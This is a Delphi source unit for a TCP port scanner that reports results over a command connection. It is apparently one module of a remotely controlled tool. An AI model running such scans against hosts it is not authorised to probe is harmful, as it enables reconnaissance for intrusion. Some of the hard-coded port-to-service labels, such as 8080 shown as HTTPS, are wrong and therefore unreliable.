unit UnitPortScanner;

interface

uses
  Windows, UnitVariables, UnitConstants, UnitFunctions, SocketUnitEx, UnitCommands;

type
	PScannerOptions = ^TScannerOptions;
  TScannerOptions = record
		Address: string;
    pBegin, pEnd: Word;
	end;	

var
  ScannerOptions: TScannerOptions;
	StopScanning: Boolean;

procedure StartPortScanner(p: Pointer); stdcall;
	
implementation

function hConnect(hHost: string; hPort: Word): Boolean;
var
  ClientSocket: TClientSocket;
begin
  ClientSocket := TClientSocket.Create;
  ClientSocket.Connect(hHost, hPort);
  if ClientSocket.Connected then Result := True else Result := False;
  ClientSocket.Disconnect;
	ClientSocket.Free;
  ClientSocket := nil;
end;

function PortToService(Port: Word): string;
begin
  if Port = 20 then Result := IntToStr(Port) + ': FTP (File Transfer Protocol)' else
  if Port = 21 then Result := IntToStr(Port) + ': FTP (File Transfer Protocol)'else
  if Port = 22 then Result := IntToStr(Port) + ': SSH (Secure Shell)' else
  if Port = 23 then Result := IntToStr(Port) + ': TELNET' else
  if Port = 25 then Result := IntToStr(Port) + ': SMTP (Send Mail Transfer Protocol)' else
  if Port = 43 then Result := IntToStr(Port) + ': WHOIS' else
  if Port = 53 then Result := IntToStr(Port) + ': DNS (Domain name service)' else
  if Port = 68 then Result := IntToStr(Port) + ': DHCP (Dynamic Host Control Protocol)' else
  if Port = 80 then  Result := IntToStr(Port) + ': HTTP (HyperText Transfer Protocol)' else
  if Port = 110 then Result := IntToStr(Port) + ': POP3 (Post Office Protocol 3)' else
  if Port = 137 then Result := IntToStr(Port) + ': NETBIOS-ns' else
  if Port = 138 then Result := IntToStr(Port) + ': NETBIOS-dgm' else
  if Port = 139 then Result := IntToStr(Port) + ': NETBIOS' else
  if Port = 143 then Result := IntToStr(Port) + ': IMAP (Internet Message Access Protocol)' else
  if Port = 161 then Result := IntToStr(Port) + ': SNMP (Simple Network Management Protocol)' else
  if Port = 194 then Result := IntToStr(Port) + ': IRC (Internet Relay Chat)' else
  if Port = 220 then Result := IntToStr(Port) + ': IMAP (Internet Message Access Protocol 3)' else
  if Port = 443 then Result := IntToStr(Port) + ': SSL (Secure Socket Layer)' else
  if Port = 445 then Result := IntToStr(Port) + ': SMB (Netbios over TCP)' else
  if Port = 1352 then Result := IntToStr(Port) + ': LOTUS NOTES' else
  if Port = 1433 then Result := IntToStr(Port) + ': MICROSOFT SQL SERVER' else
  if Port = 1521 then Result := IntToStr(Port) + ': ORACLE SQL' else
  if Port = 2049 then Result := IntToStr(Port) + ': NFS (Network File System)' else
  if Port = 3306 then Result := IntToStr(Port) + ': MySQL' else
  if Port = 4000 then Result := IntToStr(Port) + ': ICQ' else
  if (Port = 5800) or (Port = 5900) then Result := IntToStr(Port) + ': VNC' else   
  if Port = 8080 then  Result := IntToStr(Port) + ': HTTPS (HyperText Transfer Protocol Secured)' else
    Result := IntToStr(Port) + ': Unknow service port';
end;

procedure StartPortScanner(p: Pointer); stdcall;
var
  Address, TmpStr: string;
	pBegin, pEnd, Count: Word;
begin
	Address := PScannerOptions(p)^.Address;
	pBegin := PScannerOptions(p)^.pBegin;
	pEnd := PScannerOptions(p)^.pEnd;

  Count := (pEnd - pBegin) + 1;             
  MainConnection.SendDatas(PORTSCANNER + '|' + PORTSCANNERCOUNT + '|' + IntToStr(Count));

  repeat
    if hConnect(Address, pBegin) then
      TmpStr := Address + '|' + PortToService(pBegin) + '|' + 'OPEN|'
    else TmpStr := Address + '|' + PortToService(pBegin) + '|' + 'CLOSED|';

    MainConnection.SendDatas(PORTSCANNER + '|' + PORTSCANNERRESULTS + '|' + TmpStr);
    Inc(pBegin);
  until (pBegin >= (pEnd + 1)) or (StopScanning = True);
end;

end.
